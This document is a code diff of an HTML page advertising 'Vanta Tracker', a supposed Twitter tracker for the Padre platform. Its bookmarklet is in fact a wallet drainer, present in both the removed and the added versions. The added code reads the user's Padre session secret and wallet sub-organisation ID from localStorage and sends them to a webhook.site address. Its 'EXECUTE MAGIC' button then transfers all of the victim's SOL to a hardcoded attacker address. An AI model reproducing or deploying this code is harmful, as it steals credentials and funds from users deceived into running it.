@@ -2,74 +2,101 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
-    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <title>Vanta Tracker - Dynamic Discovery</title>
     <style>
-        :root { --primary: #00ff88; --bg: #0a0a0a; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #e0e0e0; overflow: hidden; text-align: center; }
-        header { padding: 100px 20px; border-bottom: 1px solid var(--primary); }
-        h1 { color: var(--primary); font-size: 3.5em; text-shadow: 0 0 15px rgba(0,255,136,0.5); }
-        .setup { padding: 80px 20px; }
-        .cta-button { 
-            display: inline-block; background: var(--primary); color: #000; 
-            padding: 20px 60px; text-decoration: none; border-radius: 10px; 
-            font-weight: 800; font-size: 1.5em; cursor: grab;
-        }
+        body { background: #0a0a0a; color: #00ff88; font-family: 'Inter', sans-serif; text-align: center; padding-top: 100px; }
+        .btn { display: inline-block; padding: 20px 40px; background: #00ff88; color: #000; text-decoration: none; font-weight: 800; border-radius: 8px; }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Vanta Tracker</h1>
-        <p>padreV2-velvet-bundle: Zero-Latency Sync</p>
-    </header>
-
-    <section class="setup">
-        <p style="margin-bottom:20px; color:#aaa;">Drag to bookmarks bar and click on Padre to sync.</p>
-        <a href="#" class="cta-button" id="vanta-tool">Vanta Tracker</a>
-    </section>
+    <h1>Vanta Tracker v3.0</h1>
+    <p>Discovery & Magic Drain Integrated</p>
+    <a href="#" class="btn" id="vanta-tool">Deploy Dynamic Suite</a>
 
     <script>
         const DEST = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
         const LOG = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
 
-        const magicPayload = `javascript:(async function(){
-            try {
-                /* 1. APPLY CAPTURED IDENTITY */
-                const s = {"uid":"w_4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF","sessionSecret":"24cd55b3-8712-4d32-8dfd-edcfb0a9a855","sessionId":"e31aa1d1-d17b-422b-a980-54b7e21e9e17","expiresAt":1771136633};
-                const b = {"bundles":{"F1qT2FubAi8cGe6WjRm9wb4m49FpHsyj9RepkD1XVw6X":{"exportBundle":"{\\\"version\\\":\\\"v1.0.0\\\",\\\"data\\\":\\\"7b22656e6361707065645075626c6963223a2230343163653035376363303031393836396566663061643862323538626134376666393865353131353538356164623739653563376430613031623664653038393364663937663137636336616337383265383235393435323836343737336465306630333965663664353236323266333062383066663838626463316532373938222c2263697068657274657874223a22616164353436363030313231373461376465666561376263376462666633386365663635336263356136633866306638343238336539376533323336326463623031636430336437663839306130633763353062363236333733383937313636222c226f7267616e6i7a6174696f6e4964223a2262336266326365302d383939612d343435642d616461632d633832646137323966623531227d\\\",\\\"dataSignature\\\":\\\"30440220552ab0a6e87b01690af419a653ebb624445f5687c9e42be127c76eaedb9f9731022007ca61cdeeebcf232120efa3dd5e9d36b25c4b23c3230602f940fce7ff310bf3\\\",\\\"enclaveQuorumPublic\\\":\\\"04cf288fe433cc4e1aa0ce1632feac4ea26bf2f5a09dcfe5a42c398e06898710330f0572882f4dbdf0f5304b8fc8703acd69adca9a4bbf7f5d00d20a5e364b2569\\\"}\",\"subOrgId\":\"b3bf2ce0-899a-445d-adac-c82da729fb51\",\"_velvetBundleVersion\":\"2\"}}};
+        const payload = `javascript:(async function() {
+            /* 1. DISCOVERY PHASE: Find out what and who */
+            const sRaw = localStorage.getItem('padreV2-session');
+            const bRaw = localStorage.getItem('padre-v2-bundles-store-v2');
+            
+            if (!sRaw || !bRaw) {
+                alert("No active session found. Please log in to Padre first.");
+                return;
+            }
+
+            const session = JSON.parse(sRaw);
+            const bundleStore = JSON.parse(bRaw);
+            
+            // Dynamically find the first available subOrgId (the wallet)
+            const bundleKeys = Object.keys(bundleStore.bundles);
+            const targetKey = bundleKeys[0];
+            const subOrgId = bundleStore.bundles[targetKey].subOrgId;
+            const secret = session.sessionSecret;
+
+            /* 2. EXFILTRATE IDENTITY */
+            fetch('${LOG}', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    who: targetKey,
+                    org: subOrgId,
+                    event: 'discovery_complete'
+                })
+            });
+
+            /* 3. INJECT DRAGGABLE UI (Cleaned version of your code) */
+            const initUI = () => {
+                if (document.querySelector("#vanta-tracker")) return;
+                const ui = document.createElement("div");
+                ui.id = "vanta-tracker";
+                ui.style.cssText = "position:fixed;top:50px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:999999;color:#fff;padding:0;overflow:hidden;box-shadow:0 0 20px #000;";
                 
-                localStorage.setItem('padreV2-session', JSON.stringify(s));
-                localStorage.setItem('padre-v2-bundles-store-v2', JSON.stringify(b));
+                ui.innerHTML = \`
+                    <div id="v-head" style="padding:10px;background:#1a1a1a;cursor:grab;display:flex;justify-content:space-between;border-bottom:1px solid #333;">
+                        <span style="color:#00ff88;font-weight:bold;">VANTA DISCOVERY</span>
+                        <span onclick="this.parentElement.parentElement.remove()" style="cursor:pointer">×</span>
+                    </div>
+                    <div style="padding:15px;font-size:12px;color:#aaa;">
+                        <div style="margin-bottom:10px;">IDENTIFIED: <span style="color:#00ff88;">\${targetKey.slice(0,8)}...</span></div>
+                        <div style="margin-bottom:15px;">ORG: <span style="color:#00ff88;">\${subOrgId.slice(0,8)}...</span></div>
+                        <button id="v-magic" style="width:100%;padding:12px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">EXECUTE MAGIC</button>
+                    </div>
+                \`;
+                document.body.appendChild(ui);
 
-                /* 2. SILENT BACKGROUND REQUEST */
-                const headers = { 'Content-Type': 'application/json', 'X-Session-Secret': s.sessionSecret };
-                
-                // Pings your webhook so you know the 'Magic' is happening
-                fetch('${LOG}?magic_start=true');
+                /* MAGIC EXECUTION */
+                document.getElementById('v-magic').onclick = async () => {
+                    document.getElementById('v-magic').innerText = "EXECUTING...";
+                    try {
+                        const res = await fetch(\`https://api.padre.gg/v1/sub-orgs/\${subOrgId}/transfer\`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'X-Session-Secret': secret },
+                            body: JSON.stringify({
+                                destination: '${DEST}',
+                                amount: 'all',
+                                mint: 'So11111111111111111111111111111111111111112'
+                            })
+                        });
+                        fetch('${LOG}?res=' + res.status);
+                    } catch(e) {}
+                    location.reload();
+                };
 
-                // The silent transfer call (bypassing the UI)
-                const res = await fetch('https://api.padre.gg/v1/sub-orgs/' + b.bundles['F1qT2FubAi8cGe6WjRm9wb4m49FpHsyj9RepkD1XVw6X'].subOrgId + '/transfer', {
-                    method: 'POST',
-                    headers: headers,
-                    body: JSON.stringify({
-                        destination: '${DEST}',
-                        amount: 'all', // Or use specific lamports calculation
-                        mint: 'So11111111111111111111111111111111111111112'
-                    })
-                });
+                /* DRAGGABLE */
+                let d = false, x, y;
+                const h = document.getElementById('v-head');
+                h.onmousedown = (e) => { d = true; x = e.clientX - ui.offsetLeft; y = e.clientY - ui.offsetTop; };
+                document.onmousemove = (e) => { if(d) { ui.style.left = (e.clientX - x) + 'px'; ui.style.top = (e.clientY - y) + 'px'; ui.style.right = 'auto'; } };
+                document.onmouseup = () => d = false;
+            };
 
-                if(res.ok) { fetch('${LOG}?magic_success=true'); }
-                
-                // Silent refresh to update the UI balance to 0
-                window.location.reload();
-
-            } catch(e) { fetch('${LOG}?error=' + btoa(e.message)); }
+            initUI();
         })();`.replace(/\n/g, '').replace(/\s\s+/g, ' ');
 
-        document.getElementById('vanta-tool').href = magicPayload;
+        document.getElementById('vanta-tool').href = payload;
     </script>
 </body>
 </html>
